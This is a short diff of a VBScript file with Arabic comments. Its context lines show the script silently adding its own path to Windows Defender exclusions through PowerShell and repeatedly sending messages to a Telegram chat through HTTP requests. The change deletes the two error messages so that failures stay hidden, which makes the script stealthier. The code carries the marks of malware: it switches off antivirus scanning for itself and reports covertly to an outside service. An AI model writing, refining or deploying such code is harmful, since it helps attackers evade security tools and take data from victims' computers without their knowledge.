@@ -24,7 +24,6 @@ On Error Resume Next
 objShell.Run "powershell -Command Add-MpPreference -ExclusionPath """ & scriptPath & """", 0, False
 If Err.Number <> 0 Then
     ' إدارة الخطأ إذا فشل الأمر
-    WScript.Echo "Failed to add exclusion to Windows Defender."
     Err.Clear
 End If
 On Error GoTo 0
@@ -68,7 +67,6 @@ Do While True
     objHTTP.Send "chat_id=" & chatID & "&text=" & EncodeURIComponent(message) & "&parse_mode=Markdown"
     If Err.Number <> 0 Then
         ' إدارة الخطأ إذا فشل الإرسال
-        WScript.Echo "Failed to send message to Telegram."
         Err.Clear
     End If
     On Error GoTo 0
